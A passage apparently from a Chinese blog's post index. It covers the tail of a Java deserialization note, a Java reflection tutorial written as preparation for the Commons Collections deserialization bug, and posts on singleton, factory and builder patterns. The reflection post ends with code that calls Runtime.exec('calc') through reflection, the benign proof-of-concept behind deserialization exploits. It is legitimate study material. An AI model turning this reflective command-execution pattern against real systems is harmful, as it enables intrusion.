&#123;  <span class="hljs-comment">//反序列化</span><br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        inputStream.readObject();<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>



<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://juejin.cn/post/6844903954774491144#heading-5">为什么hashMap要实现自己的writeObject和readObject方法</a></p>
<p><a href="https://drun1baby.top/2022/05/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-01-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%A6%82%E5%BF%B5%E4%B8%8E%E5%88%A9%E7%94%A8/#%E5%AE%9E%E6%88%98-%E2%80%94%E2%80%94%E2%80%94%E2%80%94-URLDNS">Java反序列化基础篇-01-反序列化概念与利用</a></p>
<p><a href="https://www.bilibili.com/video/BV16h411z7o9?p=2&vd_source=d195054a6a081ba07486dcc86c6ba707">Java反序列化漏洞专题-基础篇(21&#x2F;09&#x2F;05更新类加载部分)</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>反射</title>
    <url>/2024/05/16/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%B0%84/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>学习Java的反射机制是为了理解Apache Commons Collections中的反序列化漏洞做准备的。</p>
<h2 id="反射概念"><a href="#反射概念" class="headerlink" title="反射概念"></a>反射概念</h2><p>反射是一种间接操作目标对象的机制，允许程序在运行时获取类的信息，并且在运行时动态地创建对象、调用方法、访问字段等等；<strong>对于任意一个类都能够知道这个类所有的属性和方法，并且对于任意一个对象，都能够调用它的方法&#x2F;访问属性。</strong></p>
<hr>
<p>实质就是得到一个Class对象后，反向获取Class对象的对象。</p>
<h2 id="Class类、Class对象与class关键字"><a href="#Class类、Class对象与class关键字" class="headerlink" title="Class类、Class对象与class关键字"></a>Class类、Class对象与class关键字</h2><p><code>Class类</code>是java中的一个类，位于<strong>java.lang</strong>包中。它提供了用于获取类信息和操作类或对象的属性和方法的方法。<img src="https://image.sp4rks.xyz/2024/06/image-20240514205516919.png" alt="image-20240514205516919"></p>
<p><code>Class对象</code>是JVM在运行时保留的每个类的描述信息。Class对象包含了该类的所有信息，包括类的名称、属性、方法、构造函数等。Class对象可以通过Class类的各种方法获取。</p>
<p><code>class</code>是java的关键字，用于声明类。</p>
<hr>
<p><strong>对Class类解读:</strong></p>
<p>我们通常认为类是对象的抽象和集合，Class就相当于是对类的抽象和集合。<br>也可以认为对象是类的实例，类是Class的实例。</p>
<h2 id="获取Class对象"><a href="#获取Class对象" class="headerlink" title="获取Class对象"></a>获取Class对象</h2><p>通常有以下几种方法获取一个类的Class对象</p>
<h3 id="Class-forName"><a href="#Class-forName" class="headerlink" title="Class.forName()"></a>Class.forName()</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">Class&lt;?&gt; aClass = Class.forName(<span class="hljs-string">&quot;Test&quot;</span>);     如果你知道某个类的名字，想获取到这个类，就可以使⽤ forName 来获取<br></code></pre></td></tr></table></figure>

<h3 id="Test-class"><a href="#Test-class" class="headerlink" title="Test.class"></a>Test.class</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">Class&lt;?&gt; bClass = Test.class;    如果已经加载了某个类，只是想获取到它的 java.lang.Class 对象，那么就可以直接拿它的class属性。<br></code></pre></td></tr></table></figure>

<h3 id="obj-getClass"><a href="#obj-getClass" class="headerlink" title="obj.getClass()"></a>obj.getClass()</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">Test cClass= <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br>Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Test</span>&gt; aClass1 = cClass.getClass();  如果上下⽂中存在某个类的实例 obj ，那么我们可以直接通过 obj.getClass() 来获取它的类<br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2024/06/image-20240514215718317.png" alt="image-20240514215718317"></p>
<p>但在这三种获取CLass类方式中，我们一般使用第三种通过Class.forName方法去动态加载类。且使用forName就不需要import导入其他类，可以加载我们任意的类。</p>
<h2 id="实例化对象"><a href="#实例化对象" class="headerlink" title="实例化对象"></a>实例化对象</h2><p>获取到Class之后，实例化对象，<code>newInstance()</code>方法调用无参的构造器创建对象。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516090748055.png" alt="image-20240516090748055"></p>
<p>(<strong>Class</strong>类中的<code>newInstance()</code>方法)</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516102707921.png" alt="image-20240516102707921"></p>
<p><code>java.lang.relect.Constructor</code>类里也有一个<code>newInstance()</code>方法可以创建对象，该方法和Class类中的<code>newInstance()</code>方法很像，但是相比之下，Constructor类的<code>newInstance()</code>方法更加强大，我们可以通过这个<code>newInstance()</code>方法调用有参数的和私有的构造方法。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516102944537.png" alt="image-20240516102944537"></p>
<p>这时有个问题，比如一个类有很多的构造方法，我们怎么能找到我们想要的构造方法呢？我们可以使用<code>getConstructor()</code>,它根据提供的参数类型来定位特定的构造函数。可以从<code>getConstructor()</code>的函数声明中看到，参数类型是Class可变长参数。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516094652144.png" alt="image-20240516094652144"></p>
<p>因为Test类中有两个属性，<strong>Sting name</strong>和<strong>int age</strong>，<code>getConstructor()</code>填入<strong>String.class</strong>和<strong>int.class</strong>,发现报错了，报错信息提示没有这个方法</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516091359629.png" alt="image-20240516091359629"></p>
<p>可以看到Test类中<strong>age</strong>属性是私有的，这时使用<code>getDeclaredConstructor()</code>方法。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516090723742.png" alt="image-20240516090723742"></p>
<p>设置访问权限为true。就可以通过有参构造函数实例化对象。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516091419131.png" alt="image-20240516091419131"></p>
<h2 id="获取类的属性"><a href="#获取类的属性" class="headerlink" title="获取类的属性"></a>获取类的属性</h2><p>通过<code>getFields()</code>可以获取属性，但是发现这里只获取了name，age并没有被获取，原因其实和上面类似，必须用<code>getDeclaredFields()</code>并设置访问权限。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516095310090.png" alt="image-20240516095310090"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516095330837.png" alt="image-20240516095330837"> </p>
<p><code>set()</code>方法通常和<code>getField()</code>搭配使用,<code>set()</code>方法是<code>Field</code>类的一部分，用于通过反射机制设置对象的字段值，具体一点就是<code>Field</code>对象表示类中的一个成员变量，<code>set()</code>方法允许修改这个字段的值，即使该字段是私有的。在使用之前，通常需要调用<code>setAccessible(true)</code>来绕过Java的访问控制检查。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516101853830.png" alt="image-20240516101853830"></p>
<p><strong>age</strong>属性是私有的</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516102050549.png" alt="image-20240516102050549"></p>
<p>（通过<code>getDeclaredField()</code>设置访问权限）</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516102124715.png" alt="image-20240516102124715"></p>
<h2 id="调用类的方法"><a href="#调用类的方法" class="headerlink" title="调用类的方法"></a>调用类的方法</h2><p>Test类有public Hello方法和Private prHello方法。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516113808489.png" alt="image-20240516113808489"></p>
<p>通过<code>getMethods()</code>可以获取公共方法。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516112756232.png" alt="image-20240516112756232"></p>
<p>通过<code>getDeclaredMethods()</code>可以获取公共方法和私有方法</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516112826908.png" alt="image-20240516112826908"></p>
<p><code>getMethod()</code>通常和<code>invoke()</code>搭配，<code>invoke()</code>可以动态地在运行时调用对象的方法。其实也不难理解，我们通过<code>getMethod()</code>反射获得一个方法后，肯定需要指定是哪个类，并且指明执行的参数。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516131226025.png" alt="image-20240516131226025"></p>
<p>用<code>getMethod()</code>调用一下Test类中的<code>Hello()</code>方法，可以发现它调用的是无参的方法，和实例化对象的情况类似，报错了，需要指明它的类型，否则调用无参的方法。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516130413038.png" alt="image-20240516130413038"></p>
<p>(Class类中的<code>getMethod()</code>方法)</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516113750554.png" alt="image-20240516113750554"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516130817172.png" alt="image-20240516130817172"></p>
<h2 id="小练习，反射弹计算器"><a href="#小练习，反射弹计算器" class="headerlink" title="小练习，反射弹计算器"></a>小练习，反射弹计算器</h2><p>正常情况下咱们弹计算器<img src="https://image.sp4rks.xyz/2024/06/image-20240516133359336.png" alt="image-20240516133359336"></p>
<p>反射写法</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516141618708.png" alt="image-20240516141618708"></p>
<p>因为 <code>getRuntime()</code>是静态方法，属于类，所以<code>getRuntime.invoke()</code>;不需要指定对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//调用 getRuntime 方法，获得 Runtime 类的实例</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">runtimeInstance</span> <span class="hljs-operator">=</span> getRuntime.invoke(<span class="hljs-literal">null</span>);<br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516143222774.png" alt="image-20240516143222774"></p>
<p>完整代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-comment">//        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><br>        <span class="hljs-comment">//获取Runtime 类的 Class 对象</span><br>        Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        <span class="hljs-comment">//获取 Runtime 类中名为 getRuntime 的方法的引用</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getRuntime</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);<br>        <span class="hljs-comment">//调用 getRuntime 方法，获得 Runtime 类的实例</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">runtimeInstance</span> <span class="hljs-operator">=</span> getRuntime.invoke(<span class="hljs-literal">null</span>);<br>        <span class="hljs-comment">//getMethod() 方法获取 exec 方法的引用</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>        <span class="hljs-comment">//用 invoke() 方法调用 exec</span><br>        exec.invoke(runtimeInstance, <span class="hljs-string">&quot;calc&quot;</span>);<br><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>



<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/MrYushiwen/article/details/107380536">JAVA反射</a></p>
<p><a href="https://www.javasec.org/javase/Reflection/Reflection.html">java反射机制</a></p>
<p><a href="https://xz.aliyun.com/t/7029?time__1311=n4+xnD0GDti=zuDBqooGkY=G=L1K7K6dx&alichlgref=https://xz.aliyun.com/t/7029#toc-0">JAVA反序列化 - 反射机制</a></p>
<p><a href="https://xz.aliyun.com/t/9117?time__1311=n4+xuDgD9DyDnDfhx0O4BqDwp0YicWe4FPmD&alichlgref=https://www.google.com/">JAVA安全基础（二）– 反射机制</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>创建型-单例模式</title>
    <url>/2024/05/10/JAVA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="饿汉式"><a href="#饿汉式" class="headerlink" title="饿汉式"></a>饿汉式</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Singleton</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();  <span class="hljs-comment">//用于引用全局唯一的单例对象，在一开始就创建好</span><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton</span><span class="hljs-params">()</span> &#123;  <span class="hljs-comment">//不允许随便new</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;   <span class="hljs-comment">//获取全局唯一的单例对象</span><br>        <span class="hljs-keyword">return</span> instance;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Singleton</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> Singleton.getInstance();<br>        System.out.println(instance);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<h2 id="懒汉式"><a href="#懒汉式" class="headerlink" title="懒汉式"></a>懒汉式</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> &#123;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Singleton instance;  <span class="hljs-comment">//在一开始不创建对象</span><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) &#123;  <span class="hljs-comment">//如果实例为空就创建</span><br>            instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();<br>        &#125;<br>        <span class="hljs-keyword">return</span> instance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>但是这种方法有种缺陷，由于懒汉式在方法中进行初始化，在多线程的环境下，可能会出现问题。</p>
<h3 id="懒汉式-改进"><a href="#懒汉式-改进" class="headerlink" title="懒汉式-改进"></a>懒汉式-改进</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Singleton instance;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">synchronized</span> (Singleton.class) &#123;<br>                instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> instance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>但是这种效率比较低，只能又一个线程能进入同步块，其他的必须要等待</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">volatile</span> Singleton instance;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">synchronized</span> (Singleton.class) &#123;<br>                <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) &#123;<br>                    instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();  <span class="hljs-comment">//双重检查</span><br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> instance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>双重检查可以确保在多线程环境下也能保持单例的唯一性，同时尽可能地减少了同步的开销。</p>
<h3 id="JAVA特有的写法"><a href="#JAVA特有的写法" class="headerlink" title="JAVA特有的写法"></a>JAVA特有的写法</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SingletonHolder</span> &#123;  <span class="hljs-comment">//由静态内部类持有单例对象，根据类加载的特性，仅使用Singleton类时，不会对静态内部类进行初始化</span><br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Singleton</span> <span class="hljs-variable">INSTANCE</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123; <span class="hljs-comment">//只有真正使用内部类时，才会进行类初始化</span><br>        <span class="hljs-keyword">return</span> SingletonHolder.INSTANCE;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>在Java中，静态内部类在被使用之前是不会被初始化的，这是由类加载器的工作原理决定的。</p>
<p>当程序第一次访问静态内部类 <code>SingletonHolder</code> 时，JVM 会加载 <code>SingletonHolder</code> 类。这个加载过程是延迟的，只有在真正需要使用 <code>SingletonHolder</code> 类时才会触发。所以，即使 <code>Singleton</code> 类被加载了，但是不会导致 <code>SingletonHolder</code> 类被加载，也就不会创建单例对象。</p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>创建型-工厂模式</title>
    <url>/2024/05/03/JAVA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​	为了写出更“优雅”的代码，遂准备来学习JAVA的设计模式。</p>
<p>​	以前从来没有写文章的习惯，发现学过的东西容易忘记，也可能是学的过于表面，不够深入，了解了费曼学习法，决定开始码文章，当作学习记录吧，也方便回顾。</p>
<h2 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h2><p>​	JAVA的设计模式分为三类，创建型模式（关注对象的创建机制）、结构性模式（关注类和对象之间的组合）、行为型模式（关注对象之间的通信以及责任的分配）</p>
<h2 id="简单工厂模式"><a href="#简单工厂模式" class="headerlink" title="简单工厂模式"></a>简单工厂模式</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Fruit</span> &#123; <span class="hljs-comment">//水果抽象类</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> String name;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">Fruit</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name +<span class="hljs-string">&quot;@&quot;</span>+hashCode();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Apple</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Fruit</span> &#123; <span class="hljs-comment">//继承水果</span><br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">Apple</span><span class="hljs-params">()</span> &#123;<br>       <span class="hljs-built_in">super</span>(<span class="hljs-string">&quot;苹果&quot;</span>);<br>   &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Orange</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Fruit</span> &#123;	<span class="hljs-comment">//继承水果</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Orange</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>(<span class="hljs-string">&quot;橘子&quot;</span>);<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SimplefruitFactory</span> &#123; <span class="hljs-comment">//水果工厂</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Fruit <span class="hljs-title function_">getFruit</span><span class="hljs-params">(String type)</span> &#123;<br>        <span class="hljs-keyword">switch</span> (type) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;苹果&quot;</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Apple</span>();<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;橘子&quot;</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Orange</span>();<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; <span class="hljs-comment">// 处理未知类型</span><br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Fruit</span> <span class="hljs-variable">fruit</span> <span class="hljs-operator">=</span> SimplefruitFactory.getFruit(<span class="hljs-string">&quot;橘子&quot;</span>); <span class="hljs-comment">//通过工厂创建</span><br>        System.out.println(fruit);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>​	这样做的好处是，比如Apple的构造方法需要新的参数，我们只需要修改工厂里面的参数，因为其他地方是通过工厂获得的水果的实例。</p>
<p>假如现在需要增加一个新的水果类型，就需要对工厂进行修改。这不符合开闭原则。（开闭原则：一个软件实体，比如类、模块和函数应该对扩展开放，对修改关闭）。</p>
<h2 id="工厂模式"><a href="#工厂模式" class="headerlink" title="工厂模式"></a>工厂模式</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FruitFactory</span> &lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Fruit</span>&gt;&#123; <span class="hljs-comment">//将水果工厂抽象为抽象类，通过泛型指定水果类型</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> T <span class="hljs-title function_">getFruit</span><span class="hljs-params">()</span>;  <span class="hljs-comment">//不同的水果工厂，生产不同的水果</span><br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AppleFactora</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">FruitFactory</span>&lt;Apple&gt;&#123; <span class="hljs-comment">//假如需要苹果就创建一个苹果工厂类，新增橘子，蓝莓，等等同理</span><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Apple <span class="hljs-title function_">getFruit</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Apple</span>();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Apple</span> <span class="hljs-variable">fruit</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AppleFactora</span>().getFruit();<br>        System.out.println(fruit);<br>    &#125;<br><br></code></pre></td></tr></table></figure>

<p>​	屏蔽了对象的创建细节，使用者只需要关心如何使用对象，降低了客户端与对象之间的耦合度。</p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>创建型-建造者模式</title>
    <url>/2024/05/08/JAVA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E5%BB%BA%E9%80%A0%E8%80%85%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-type">int</span> id;<br>    <span class="hljs-type">int</span> age;<br>    String name;<br>    String gender; <br>    String profession;<br>    List&lt;String&gt; awards;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(<span class="hljs-type">int</span> id, <span class="hljs-type">int</span> age, String name, String gender, String profession, List&lt;String&gt; awards)</span> &#123;<br>        <span class="hljs-built_in">this</span>.id = id;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.gender = gender; <br>        <span class="hljs-built_in">this</span>.profession = profession;<br>        <span class="hljs-built_in">this</span>.awards = awards;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>学生类的属性非常多，导致构造函数，也非常多，如果我们通过new的方式创建很容易填错参数位置。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        List&lt;String&gt; awards = Arrays.asList(<span class="hljs-string">&quot;LPL 春季赛冠军&quot;</span>,<span class="hljs-string">&quot;上海Major冠军&quot;</span>);<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-number">1</span>, <span class="hljs-number">18</span>, <span class="hljs-string">&quot;小明&quot;</span>, <span class="hljs-string">&quot;男&quot;</span>, <span class="hljs-string">&quot;计算机科学与技术&quot;</span>, awards);<br>        System.out.println(student);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

